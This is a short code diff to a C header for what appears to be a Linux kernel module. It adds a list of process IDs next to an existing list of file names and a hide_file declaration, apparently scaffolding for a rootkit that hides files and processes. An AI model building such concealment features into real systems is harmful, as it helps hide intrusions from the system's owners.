@@ -13,11 +13,17 @@
 #include <linux/list.h>
 
 extern struct list_head list_files;
-//LIST_HEAD macro can't be used because we need to declare it as extern
+extern struct list_head list_pids;
+//LIST_HEAD macro can't be used because we need to declare them as extern
 
 struct list_files_node{
 	struct list_head list; // prev and next
 	char* name;
+};
+
+struct list_pids_node{
+	struct list_head list;
+	int pid;
 };
 
 int hide_file(const char* name);
